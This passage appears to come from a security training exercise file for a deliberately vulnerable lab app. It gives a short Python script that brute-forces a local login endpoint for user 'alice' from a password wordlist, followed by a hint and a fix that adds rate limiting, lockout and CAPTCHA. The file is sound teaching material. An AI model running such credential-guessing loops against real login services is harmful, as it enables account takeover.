      # Or using a simple Python script:
      python3 -c "
      import requests
      with open('/usr/share/wordlists/common-passwords.txt') as f:
          for line in f:
              pw = line.strip()
              r = requests.post('http://localhost:8080/api/a07/auth/login',
                                json={'username':'alice','password':pw})
              if 'token' in r.text:
                  print('Found:', pw); break
              print('Tried:', pw)
      "
      ```
    hint: >-
      How many failed attempts are needed before anything changes?
    fix: >-
      Add rate limiting and account lockout:

      ```java
      @RateLimiter(key = "#username", rate = "5/minute")
      ```

      Combine it with per-account lockout after N failures and a CAPTCHA on
      web-facing login forms.
